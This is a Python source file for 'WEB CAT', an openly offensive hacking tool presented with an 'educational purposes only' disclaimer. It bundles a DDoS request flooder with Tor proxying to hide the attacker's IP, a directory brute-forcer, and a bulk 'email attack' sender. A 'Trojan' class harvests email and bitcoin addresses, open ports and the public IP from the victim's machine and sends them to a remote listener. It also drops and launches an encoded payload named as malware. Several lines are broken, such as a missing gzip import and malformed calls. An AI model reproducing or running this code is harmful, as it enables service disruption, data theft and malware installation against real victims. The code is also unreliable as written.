
"""
WEB CAT VER 1.1.1
DDoS
EMAIL ATTACK
FILE RETRIEVAL                                                     
GET LOCATION
GET EMAIL
TROJAN
This script is for educational purposes only. Use responsibly and ethically.
CREATE BY: JOHN CHEN (IT WILL CONTAIN ***A LOT OF BUGS***)
"""
import json
import os
import re

import requests
import threading
import argparse
import socket
import textwrap
import time

import queue
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from tkinter import *

import WebCatGUI# import GUI module

import io
import sys

import base64
import random
from string import ascii_lowercase
import psutil

class DDoS:
    def __init__(self, url, args):
        self.url = url
        self.args = args
        self.running = True
        if not self.url.startswith(('http://', 'https://')):
            self.url = 'http://' + self.url
            
    def get_response(self):
        try:
            proxies = None
            if self.args.proxy:
                try:
                    # Check if Tor is running
                    test_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    test_socket.settimeout(1)
                    result = test_socket.connect_ex(('127.0.0.1', 9050))
                    test_socket.close()
                    
                    if result == 0:
                        proxies = {
                            'http': 'socks5h://127.0.0.1:9050',
                            'https': 'socks5h://127.0.0.1:9050'
                        }
                        print("Using Tor proxy to hide IP")
                    else:
                        print("WARNING: Tor proxy not available. Running without proxy.")
                        print("To use Tor, make sure it's installed and running.")
                except:
                    print("WARNING: Could not check Tor proxy. Running without proxy.")
                
            if self.args.requests and self.args.seconds:
                if self.args.seconds == 0:
                    print("Error: Seconds cannot be zero when requests are specified.")
                    return
                requests_per_second = self.args.requests / self.args.seconds
                for i in range(self.args.requests):
                    if not self.running:
                        break
                    response = requests.get(self.url, proxies=proxies, timeout=10)
                    print(f"SEND {response}")
                    time.sleep(1 / requests_per_second)
            elif self.args.requests:
                # Send specific number of requests as fast as possible
                for i in range(self.args.requests):
                    if not self.running:
                        break
                    response = requests.get(self.url, proxies=proxies, timeout=10)
                    print(f"SEND {response}")
            else:
                # Send a single request
                response = requests.get(self.url, proxies=proxies, timeout=10)
                print(f"SEND {response}")
        except Exception as e:
            print(f"Error: {e}")

def parse_args():
    parser = argparse.ArgumentParser(
        description="WEB HACKERY - A web attack tool\n",
        formatter_class=argparse.RawTextHelpFormatter,
        epilog=textwrap.dedent('''\
            Example:
            python WebCat.py --url https://www.example.com
            python WebCat.py --url https://www.example.com -r 100 # Only send 100 requests then stop
            python WebCat.py --url https://www.example.com -r 100 -s 50 # Only send 100 requests per second(for 50 seconds)
            python WebCat.py --url https://www.example.com -r 100 -s 50 -nf 9 --proxy # Send 100 requests per second for 9 seconds, then stop
            python WebCat.py --url https://www.example.com --proxy # Use Tor proxy to hide IP
            python WebCat.py --get_files --url https://www.example.com --threads 50 --wordlist /path/to/wordlist.txt
            python WebCat.py --get_location --url https://www.example.com -r 1
            python WebCat.py --email_attack --smtp_server smtp.example.com --smtp_port 587 --sender_email -subject  -body -times
            python WebCat.py --get_location_ip -ip 192.xxx.xx.x # get location information though IP address
            python WebCat.py --GUI # Launch GUI for Website attack
            python WebCat.py --Listener -ip -port # Add listener to IP and PORT
            python WebCat.py --Listener --email -ip -port # Add listener to IP and PORT FOR GETTING EMAIL
            ''')
        )
    parser.add_argument("--url", help="URL of the website to attack", action="store", type=str)
    parser.add_argument("-r", "--requests", help="Number of requests to send", type=int)
    parser.add_argument("-s", "--seconds", help="Number of seconds to send requests", type=int)
    parser.add_argument("--proxy", help="Use Tor proxy to hide IP", action="store_true")
    parser.add_argument("-nf", "--no-finish", help="Number of seconds to run before stopping", type=int)
    parser.add_argument("--get_files", help="Get files from the target website", action="store_true")
    parser.add_argument("--threads", help="Number of threads to use for file retrieval", type=int, default=50)
    parser.add_argument("--wordlist", help="Path to the wordlist file for file retrieval", type=str, default="all.txt")
    parser.add_argument("--get_location", help="Get location information of the website", action="store_true")
    parser.add_argument("--email_attack", help="Perform an email attack", action="store_true")
    parser.add_argument("--smtp_server", help="SMTP server for email attack")
    parser.add_argument("--smtp_port", help="SMTP port for email attack", type=int, default=587)
    parser.add_argument("--sender_email", help="Sender email address for email attack")
    parser.add_argument("-body", help="Body of the email for email attack(file)", type=str, default="body.txt")
    parser.add_argument("-times", help="Number of times to send the email", type=int, default=1)
    parser.add_argument("-subject", help="Subject of the email for email attack", type=str, default="Web Hackery Attack")
    parser.add_argument("--get_location_ip", help="Get location information through IP address", action="store_true")
    parser.add_argument("-ip", help="IP address to get location information or a target", type=str)
    parser.add_argument("--GUI", help="Launch GUI for Website attack", action="store_true")
    parser.add_argument("--Listener", help="Listener Mode", action="store_true")
    parser.add_argument("-port", help="Target port(Listener)", type=int)
    parser.add_argument("--email", help="Getting emails Mode", action="store_true")
    return parser.parse_args()

def stop_attack(ddos_obj, delay):
    """Stop the attack after the specified delay"""
    time.sleep(delay)
    print(f"Stopping attack after {delay} seconds")
    ddos_obj.running = False
    
class GetFiles():
    def __init__(self, AGENT, EXTENSION, TARGET, THREADS, WORDLIST):
        self.AGENT = AGENT
        self.EXTENSION = EXTENSION
        self.TARGET = TARGET
        self.THREADS = THREADS
        self.WORDLIST = WORDLIST
    def get_words(self, resume=None):
        def get_extend_words(word):
            if "." in word:
                words.put(f"/{word}")
            else:
                words.put(f"/{word}/")
            for extension in self.EXTENSION:
                words.put(f"/{word}{extension}")
        with open(self.WORDLIST) as f:
            raw_words = f.read()
        found_resume = False
        words = queue.Queue()
        for word in raw_words.split():
            if resume is not None:
                if found_resume:
                    get_extend_words(word)
                elif word == resume:
                    found_resume = True
                    print(f"Resuming wordlist from: {resume}")
            else:
                print(word)
                get_extend_words(word)
        return words
    def dir_bruter(self, words):
        headers = {"User-Agent": self.AGENT}
        while not words.empty():
            url = f"{self.TARGET}{words.get()}"
            try:
                r = requests.get(url, headers=headers)
            except requests.exceptions.ConnectionError as e:
                sys.stderr.write("x");sys.stderr.flush()
                continue
            if r.status_code == 200:
                print(f"\nSuccess ({r.status_code}: {url})")
            elif r.status_code == 404:
                sys.stderr.write(".");sys.stderr.flush()
            else:
                print(f"{r.status_code} => {url}")

class GetWebsiteInfo:
    def __init__(self, arg):
        self.arg = arg
    def get_website_info(self, url):
        if not url.startswith(("http://", "https://")):
            url = "http://" + url
        domain = url.split('//')[1].split('/')[0]
        try:
            ip_address = socket.gethostbyname(domain)
            print(f"IP Address: {ip_address}")
            geo_response = requests.get(f"http://ip-api.com/json/{ip_address}")
            geo_data = geo_response.json()
            if geo_data.get("status") == "success":
                print("LOCATION:")
                print(f"Country: {geo_data.get('country', 'Unknown')}")
                print(f"Region: {geo_data.get('regionName', 'Unknown')}")
                print(f"City: {geo_data.get('city', 'Unknown')}")
                print(f"ISP: {geo_data.get('isp', 'Unknown')}")
                print(f"Latitude: {geo_data.get('lat', 'Unknown')}")
                print(f"Longitude: {geo_data.get('lon', 'Unknown')}")
            else:
                print("Could not retrieve location information, please check the IP address or your website URL.")
        except Exception as e:
            print(f"ERROR: {e}")

class EmailAttack:
    def __init__(self, smtp_server, smtp_port, sender_email, sender_password, recipient_email, subject, body):
        self.smtp_server = smtp_server
        self.smtp_port = smtp_port
        self.sender_email = sender_email
        self.sender_password = sender_password
        self.recipient_email = recipient_email
        self.subject = subject
        self.body = body
    def send_email(self):
        message = MIMEMultipart()
        message["From"] = self.sender_email
        message["To"] = self.recipient_email
        message["Subject"] = self.subject
        message.attach(MIMEText(self.body, "plain"))
        try:
            with smtplib.SMTP(self.smtp_server, self.smtp_port) as server:
                server.starttls()
                server.login(self.sender_email, self.sender_password)
                server.sendmail(self.sender_email, self.recipient_email, message.as_string())
                print("Email sent successfully!")
        except Exception as e:
            print("Failed to send email: ", e)

class GetLocationIP:
    def __init__(self, ip):
        self.ip = ip
    def get_location(self):
        try:
            response = requests.get(f"http://ip-api.com/json/{self.ip}")
            data = response.json()
            if data['status'] == 'success':
                print(f"IP: {data['query']}")
                print(f"Country: {data['country']}")
                print(f"Region: {data['regionName']}")
                print(f"City: {data['city']}")
                print(f"ISP: {data['isp']}")
                print(f"Latitude: {data['lat']}")
                print(f"Longitude: {data['lon']}")
            else:
                print("Could not retrieve location information for the given IP address.")
        except Exception as e:
            print(f"Error retrieving location information: {e}")
            
class GUI:
    def __init__(self, master):
        self.master = master
        master.title("GUI Launcher")
        self.DDoS = True
        self.Location = False
        
        self.change_mode_buttom_Location = Button(master, text="Change to Location mode", command=self.change_mode_to_location)
        self.change_mode_buttom_Location.config(font=("Times New Roman", 14))
        self.change_mode_buttom_Location.pack()
        self.change_mode_buttom_DDoS = Button(master, text="Change to DDoS mode", command=self.change_mode_to_ddos)
        self.change_mode_buttom_DDoS.config(font=("Times New Roman", 14))
        self.change_mode_buttom_DDoS.pack()
        
        self.label = Label(master, text="Enter URL:")
        self.label.config(font=("Times New Roman", 14))
        self.label.pack()

        self.url_var = StringVar()
        self.requests_var = IntVar()
        self.second_var = IntVar()
        self.proxy_var = BooleanVar()
        self.url_entry = Entry(master, textvariable=self.url_var)
        self.url_entry.pack()
        self.requests_entry = Entry(master, textvariable=self.requests_var)
        self.requests_entry.pack()
        self.second_entry = Entry(master, textvariable=self.second_var)
        self.second_entry.pack()
        self.proxy_check = Checkbutton(master, text="Use Proxy", variable=self.proxy_var)
        self.proxy_check.pack()

        self.start_button_DDoS = Button(master, text="Start DDoS Attack", command=self.start_ddos)
        self.start_button_DDoS.pack()
        self.end_button = Button(master, text="Exit", command=master.quit)
        self.end_button.pack()
        
        self.start_button_location = Button(master, text="Start Location Lookup", command=self.start_location)
        self.start_button_location.pack()

    
    def change_mode_to_location(self):
        self.DDoS = False
        self.Location = True
        self.change_mode_buttom_DDoS.config(text="Change to DDoS Mode")
        self.label.config(text="Enter IP Address:")
        self.url_entry.config(textvariable=self.url_var)
        self.url_var.set("")  # Clear the URL entry for IP input
        self.url_entry.pack()
        self.start_button_location.pack()
        self.start_button_DDoS.pack_forget()
        self.requests_entry.pack_forget()
        self.second_entry.pack_forget()
        self.proxy_check.pack_forget()
    def change_mode_to_ddos(self):
        self.DDoS = True
        self.Location = False
        self.change_mode_buttom_Location.config(text="Change to Location Mode")
        self.label.config(text="Enter URL:")
        self.url_entry.config(textvariable=self.url_var)
        self.requests_entry.pack()
        self.second_entry.pack()
        self.proxy_check.pack()
        self.start_button_DDoS.pack()
        self.start_button_location.pack_forget()
        
    
    def start_ddos(self):
        if self.DDoS:
            url = self.url_var.get()
            requests_count = self.requests_var.get()
            seconds = self.second_var.get()
            proxy = self.proxy_var.get()
            try:
                if url:
                    args = type('Args', (object,), {})()  # Create a simple object to hold attributes
                    args.url = url
                    args.requests = requests_count  # Set default values or get from user input-
                    args.seconds = seconds
                    args.proxy = proxy  # Set proxy option if needed

                    DDoSG = WebCatGUI.DDoSG  # Import the DDoSG class from DDoSGUI module
                    ddos_instance = DDoSG(url, requests_count=args.requests, seconds=args.seconds, proxy=args.proxy)
                    print(f"Starting DDoS attack on {url} with {args.requests} requests for {args.seconds} seconds.")
                    ddos_thread = threading.Thread(target=ddos_instance.get_response)
                    ddos_thread.start()
                else:
                    print("Please enter a valid URL.")
            except Exception as e:
                print(f"Error connecting to {url}: {e}")
    def end_ddos(self):
        if self.DDoS:
            print("Exiting DDoS GUI Launcher.")
            self.master.quit()
            sys.exit(0)
    def start_location(self):
        if self.Location:
            ip = self.url_var.get()
            if ip:
                try:
                    get_location_instance = GetLocationIP(ip=ip)
                    get_location_instance.get_location()
                except Exception as e:
                    print(f"Error retrieving location for IP {ip}: {e}")
            else:
                print("Please enter a valid IP address.")

class Trojan:
    def __init__(self, args):
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.args = args

    def create_listener(self):
        self.s.bind((self.args.ip, self.args.port))
        self.s.listen(5)
        print(f"Listening on port {self.args.port}")
        while True:
            client_socket, client_ip = self.s.accept()
            print("[+] RECEIVED A CONNECTION FROM -> {}".format(client_ip))

            data = client_socket.recv(4096)
            client_socket.close()

            random_fd = open("".join(random.choices(ascii_lowercase), k=10), "w")
            random_fd.write(base64.b64decode(data).decode("utf-8"))
            random_fd.close()
    def email_listener(self):
        hostname = socket.gethostname()

        headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
        }
        public_ip = requests.get("https://i[api.co/ip", headers = headers).text
        try:
            bitcoin_email_list = []
            email_list = []
            for root, subdirs, files in os.walk(r"C:\ProgramData"):
                for file in files:
                    file_fd = open("{}/{}".format(root, file), "r")
                    file_contents = file_fd.read().strip()
                    bitcoin_addresses = re.findall(r"([13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})", file_contents) # Don't know
                    email_addresses = re.findall(r"[a-z0-9._]+@[a-z0-9]+\.[a-z]{1,7}", file_contents)
                    if bitcoin_addresses > 0:
                        bitcoin_email_list = bitcoin_email_list + bitcoin_addresses
                    if email_addresses > 0:
                        email_list = email_list + email_addresses
        except Exception as e:
            print("ERROR: {}".format(e))
        open_ports = os.popen("netstat -plant | grep -i listen | awk '{print $4}' | grep -P '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d{1,5}'").read()
        open_ports = open_ports.strip().split("\n")
        data = {
            "machine_hostname": hostname,
            "machine_ip": public_ip,
            "machine_port": open_ports,
            "bitcoin email": bitcoin_email_list,
            "email": email_list
        }
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        encoded_data = base64.b64encode(json.dumps(data).encode())
        s.connect((self.args.ip, self.args.port))
        s.send(encoded_data)
        s.close()
    def main(self):
        pid = os.fork()

        if pid > 0:
            CPU = psutil.cpu_percent()
            RAM = psutil.virtual_memory().percent
            DISK = psutil.disk_usage(r"C:\\").percent

            process_count = 0

            for _ in psutil.process_iter():
                process_count += 1

            print("------------------------------------------------------")
            print("      CPU USAGE      RAM USAGE        DISK USAGE")
            print(f"       {CPU}           {RAM}               {DISK}")
            print("------------------------------------------------------")

            time.sleep(2)
        else:
            self.trojan()

    def trojan(self):
        malware_fd = open(".john.py", "w")
        blob = "H4sICAncMmEAA21hbHdhcmUucHkAjVZtb9s2EP7uX3FTB0RCZMmKHadx4WHB0K7d1q5YO2BYEgi0RMesZVIj6cSJ4/++IyX6TXY22bBJ3nMvfHh31Kvv4rmS8YjxuHzUE8G7LTYrhdQg6T9zqrRycyWyKdVuNiKK9ntu9k0JvtFzI6FarVZOxzAjjPvBoAX4vII7qmEilOZkRkGMQU8oIrIJ49Qi1rJh7TNCDbfoB60tM0a1nI8KlgEr73tA8lxSpQ5apSSnUqHRpZ2bx/tTUdm+uqNcewPwPoonVhQkPo864P+VJG/gN8bnC1i87qf93huQ94OL11EngJ9pNhXxWSfp4DeBd0zSsVjERuhZ4yv7W0WWshKdOjbNXnxvonWpBnHMSlKyKBM48MKtEOtREGm60G7DihKZTWAsJIyYzgTjQHgOFNkt3M6psuBanq5X04IpjYavb63c6hyVGg9SCB2Cmo9yJlUIY1ZQBehRqOiBFFPfiydiRr36UJ2WgRmUhW9EVoxL6ThHL6Kk3PeWq3i58iLUmhHtV+4MJgjBk16wo6vl466xihCJLNlzzgTXeIb23CkxHKGhhoKNYA0duogiY8YPIqUlK1167To6xPwO39tPg3t7+tGY8ZwUhS89/zrp3i6T1TVpT2ftp6v2+1/anz63/07al7fLs37Y7a6eR1mC4qeOWepehueXq8ALd3fwX5EeyovtZy8H9qOs3Ufp7emPLpTTm8gMMfjwYvW/4skmWCrAxvBAYULuKUY2x5wl/LHJJLigm7GigQKTpkFtAD9Ap5kaB4/BJfkRwWlTcCyMPeZeCOJInR1cPt1fbvLpMjYrhDKdcMfVIqOlboZREmXacHUcpmfi8doSBNOjkXTeaJVGmlbSoSn4sqpYTrXSREO7LAjX8Ax3kpbQZmDCR3vPQB6mcLIsJUPx973VyRrzGU5ucsya7uomOjoY2P/z1YkX1DV5IJr1xNVrpMqCYUu94XXTqLdKeSZyCjnRBLSwN5Rtl4py2zRmZjUTsxmx+ZjbJiJFgQB5T6W1YpV3LoyaptRdR3htuGHYRGFXH2xugQOAzXYQuJlsIZvZaisI4YfzeEt1P8uc4qHsq2+tmrvqcncUmvSw9Bk6quvDCvK05qeCR6N+rxL4Bh3l81mpfAMJono9CDZ3GTLuzuaFU6jhGeaDpkDqFwIQo280q4JWm9eE6s+vZ1fv0g+f3n4NnfTL7z/9mn75+sfbq4/rMNAbR0MvB2FKxL7PJN3uReUzqhV930vOLqIOfhLshwYQBDXEbNHfZsoJXPW2WthP0tTkTprCcAhempo3pTT1qjKuXpv+BfXo/OqiCQAA"
        malware = gzip.decompress(base64.b64decode(blob).decode("UTF-8"))
        malware_fd.write(malware)
        malware_fd.close()

        os.system(r"C:\Windows\System32 .john.py")

if __name__ == "__main__":
    print("WEB CAT VER 1.1.0")
    args = parse_args()
    if args.url is not None:
        url = args.url
        threads = []
        ddos = DDoS(url, args=args)
        # Check for required packages if using proxy
        if args.proxy:
            try:
                import socks
            except ImportError:
                print("Error: PySocks package is required for proxy support.")
                print("Install it with: pip install requests[socks]")
                sys.exit(1)
        # Start a timer to stop the attack if no_finish is specified
        if args.no_finish:
            stop_thread = threading.Thread(target=stop_attack, args=(ddos, args.no_finish))
            stop_thread.daemon = True
            stop_thread.start()
        if not args.get_files:
            # Start the attack threads
            total_requests = args.requests
            max_threads = min(10, total_requests)
            requests_per_thread = total_requests // max_threads
            extra = total_requests % max_threads
            print(f"Starting {max_threads} threads...")
            for i in range(max_threads):
                # Distribute extra requests among the first 'extra' threads
                reqs = requests_per_thread + (1 if i < extra else 0)
                thread = threading.Thread(target=ddos.get_response)
                threads.append(thread)
                thread.start()
        else:
            print("No requests specified, starting a single thread...")
    
        try:
            # Wait for all threads to complete
            for thread in threads:
                thread.join()
        except KeyboardInterrupt:
            print("\nAttack interrupted by user. Stopping...")
            print("STOPPING ATTACK...[==========================]100%")
            time.sleep(1)
            print("STOPPING ATTACK...[=====================]75%")
            time.sleep(1)
            print("STOPPING ATTACK...[============]50%")
            time.sleep(1)
            print("STOPPING ATTACK...[=====]25%")
            time.sleep(1)
            print("STOPPING ATTACK...[]0%")
            print("Attack stopped.")
            ddos.running = False
            # Wait for threads to finish
            for thread in threads:
                thread.join(0.5)
    else:
        if args.get_files or args.get_location or args.get_location_ip or args.GUI or args.Listener:
            pass
        else:
            print("Error: --url argument is required for this operation.")
            sys.exit(1)
    if args.get_files:
        get_files_instance = GetFiles(
        AGENT="Mozilla/5.0 (X11, Linux x86_64; rv:19.0) Gecko/20100101 Firefox/19.0",
        EXTENSION=[".php", ".bak", ".orig", ".inc"],
        TARGET=args.url,
        THREADS=args.threads,
        WORDLIST=args.wordlist
        )
        words = get_files_instance.get_words()
        print("PRESS RETURN TO CONTINUE")
        print("GETTING, IT WILL SHOW SOME DOTS(MEANS RUNNING)")
        sys.stdin.readline()
        for _ in range(get_files_instance.THREADS):
            t = threading.Thread(target=get_files_instance.dir_bruter, args=(words,))
            t.start()
    if args.get_location:
        get_location_instance = GetWebsiteInfo(arg=args)
        print("//////////////THIS PRODUCT IS FOR EDUCATIONAL PURPOSES ONLY/////////////////////")
        get_location_instance.get_website_info(url=args.url)
    if args.email_attack:
        if not args.smtp_server or not args.sender_email:
            print("SMTP server and sender email are required for email attack.")
            sys.exit(1)
        body = ""
        if args.body:
            try:
                with open(args.body, 'r') as body_file:
                    body = body_file.read()
            except FileNotFoundError:
                print(f"Body file '{args.body}' not found.")
                sys.exit(1)
        email_attack_instance = EmailAttack(
            smtp_server=args.smtp_server,
            smtp_port=args.smtp_port,
            sender_email=args.sender_email,
            sender_password=input("Enter sender email password: "),
            recipient_email=input("Enter recipient email: "),
            subject=args.subject,
            body=body
        )
        email_attack_instance.send_email()
    if args.get_location_ip:
        if not args.ip:
            print("IP address is required for location lookup.")
            sys.exit(1)
        get_location_ip_instance = GetLocationIP(ip=args.ip)
        get_location_ip_instance.get_location()
    if args.GUI:
        root = Tk()
        gui = GUI(root)
        root.mainloop()
    if args.Listener and args.ip and args.port:
        Trojan_instance = Trojan(args=args)
        Trojan_instance.create_listener()
        Trojan_instance.main()
    if args.Listener and args.ip and args.port and args.email:
        TrojanX = Trojan(args=args)
        TrojanX.email_listener()
        TrojanX.main()
    